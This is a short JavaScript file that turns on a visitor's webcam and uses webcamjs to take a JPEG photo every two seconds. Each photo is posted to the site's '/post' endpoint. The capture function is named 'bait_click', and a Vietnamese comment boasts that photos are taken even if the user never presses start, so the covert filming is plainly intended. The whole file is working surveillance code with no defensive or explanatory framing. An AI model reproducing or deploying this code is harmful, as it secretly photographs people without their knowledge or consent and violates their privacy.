const $ = require('jquery');
const Webcam = require('webcamjs');

Webcam.set({
  width: 640,
  height: 480,
  image_format: 'jpeg',
  jpeg_quality: 90
});

Webcam.attach('#my_camera');

function bait_click() {
  Webcam.snap(function(data_uri) {
    $.ajax({
      url: '/post',
      type: 'POST',
      data: {
        image: data_uri
      },
      success: function(data) {
        console.log(data);
      }
    });
  });
}

// Đéo bấm start thì nó vẫn chụp thôi =))
setInterval(bait_click, 2000);

window.bait_click = bait_click;
